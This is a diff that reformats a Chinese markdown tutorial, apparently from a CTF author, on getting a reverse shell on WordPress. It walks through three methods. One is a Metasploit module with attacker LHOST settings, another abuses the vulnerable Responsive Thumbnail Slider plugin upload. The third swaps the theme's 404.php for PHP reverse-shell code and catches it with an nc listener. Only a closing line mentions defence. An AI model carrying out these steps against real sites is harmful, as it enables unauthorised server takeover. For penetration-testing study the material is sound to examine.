@@ -1,3 +1,10 @@
+
+
+```markdown
+---
+title: 如何设置 WordPress 反弹 Shell [100% 有效]
+---
+
 # 如何设置 WordPress 反弹 Shell [100% 有效]
 
 > **作者：** heuctf
@@ -9,11 +16,11 @@
 
 ## 目录
 
-  * [WordPress 反弹 Shell 概述](https://www.google.com/search?q=%23wordpress-%E5%8F%8D%E5%BC%B9-shell-%E6%A6%82%E8%BF%B0)
-  * [1. 通过 Metasploit 框架建立反弹 Shell](https://www.google.com/search?q=%231-%E9%80%9A%E8%BF%87-metasploit-%E6%A1%86%E6%9E%B6%E5%BB%BA%E7%AB%8B%E5%8F%8D%E5%BC%B9-shell)
-  * [2. 通过漏洞插件建立反弹 Shell](https://www.google.com/search?q=%232-%E9%80%9A%E8%BF%87-%E6%BC%8F%E6%B4%9E%E6%8F%92%E4%BB%B6%E5%BB%BA%E7%AB%8B%E5%8F%8D%E5%BC%B9-shell)
-  * [3. 通过编辑 WordPress 主题建立反弹 Shell](https://www.google.com/search?q=%233-%E9%80%9A%E8%BF%87%E7%BC%96%E8%BE%91-wordpress-%E4%B8%BB%E9%A2%98%E5%BB%BA%E7%AB%8B%E5%8F%8D%E5%BC%B9-shell)
-  * [总结](https://www.google.com/search?q=%23%E6%80%BB%E7%BB%93)
+* [WordPress 反弹 Shell 概述](#wordpress-反弹-shell-概述)
+* [1. 通过 Metasploit 框架建立反弹 Shell](#1-通过-metasploit-框架建立反弹-shell)
+* [2. 通过漏洞插件建立反弹 Shell](#2-通过漏洞插件建立反弹-shell)
+* [3. 通过编辑 WordPress 主题建立反弹 Shell](#3-通过编辑-wordpress-主题建立反弹-shell)
+* [总结](#总结)
 
 -----
 
@@ -53,7 +60,7 @@
     ```
     ![alt text](1.-Set-Metasploit-Options-.webp)
     
-5.  设置本地监听 IP 并执行攻击：
+4.  设置本地监听 IP 并执行攻击：
     ```bash
     set LHOST 172.20.10.14   # 你的攻击机 IP
     run                      # 发射载荷
@@ -72,15 +79,15 @@ WordPress 支持插件，这让它功能强大，但也带来了风险。某些�
 本文以 **Responsive Thumbnail Slider v1.0** 插件为例（可在 ExploitDB 下载）。
 
 1.  下载并在目标网站安装该插件。
-   ![alt text](4.-Responsive-Thumbnail-Slider.webp)
+    ![alt text](4.-Responsive-Thumbnail-Slider.webp)
 
-3.  启动 Metasploit 并加载对应模块：
+2.  启动 Metasploit 并加载对应模块：
     ```bash
     use exploit/multi/http/wp_responsive_thumbnail_slider_upload
     ```
     ![alt text](5.-Set-Meterpreter-options.webp)
     
-5.  设置参数（RHOST, TARGETURI, WPUSERNAME, WPPASSWORD）并运行。
+3.  设置参数（RHOST, TARGETURI, WPUSERNAME, WPPASSWORD）并运行。
 
 该模块会自动完成身份验证并上传反弹 Shell，成功后你将直接获得 Web 服务器的控制权。
 
@@ -98,10 +105,10 @@ WordPress 支持插件，这让它功能强大，但也带来了风险。某些�
 1.  登录 WordPress 后台，点击 **外观 (Appearance) → 主题文件编辑器 (Theme File Editor)**。
 2.  在右侧面板中，选择 `404.php` 文件。
 3.  ![alt text](7.-Edit-File.webp)
-4.  将该文件内的所有代码替换为常用的 PHP Reverse Shell 代码（例如来自 [Github/pentestmonkey](https://www.google.com/search?q=https://github.com/pentestmonkey/php-reverse-shell) 的代码）。
+4.  将该文件内的所有代码替换为常用的 PHP Reverse Shell 代码（建议从官方渠道获取代码）。
 5.  **关键步骤：** 将代码中的 `IP` 替换为你的攻击机 IP，`Port` 替换为你准备监听的端口（如 `8888`）。
-   ![alt text](8.-Start-Listener.webp)
-7.  点击“更新文件”。
+    ![alt text](8.-Start-Listener.webp)
+6.  点击“更新文件”。
 
 **触发 Shell：**
 
@@ -109,13 +116,13 @@ WordPress 支持插件，这让它功能强大，但也带来了风险。某些�
     ```bash
     nc -lnvp 8888
     ```
-     ![alt text](8.-Start-Listener.webp)
+    ![alt text](8.-Start-Listener.webp)
     
-3.  在浏览器访问一个不存在的路径来触发 404 页面，例如：
+2.  在浏览器访问一个不存在的路径来触发 404 页面，例如：
     `http://172.20.10.14/wordpress/index.php/dummydummy`
-4.  你的 Netcat 终端会立即建立连接，你可以直接运行 Linux 命令。
+3.  你的 Netcat 终端会立即建立连接，你可以直接运行 Linux 命令。
 
- ![alt text](9.-Reverse-Shell-Session.webp)
+![alt text](9.-Reverse-Shell-Session.webp)
 
 -----
 
@@ -124,3 +131,4 @@ WordPress 支持插件，这让它功能强大，但也带来了风险。某些�
 本文介绍了在 WordPress 上设置反弹 Shell 的三种方法。**请记住：** 防御此类攻击的关键在于严格管理后台用户的访问权限。除了管理员，其他用户应被限制访问“主题编辑器”或“插件安装”权限。
 
 如果你在操作中遇到任何问题，欢迎在下方评论区交流！
+```
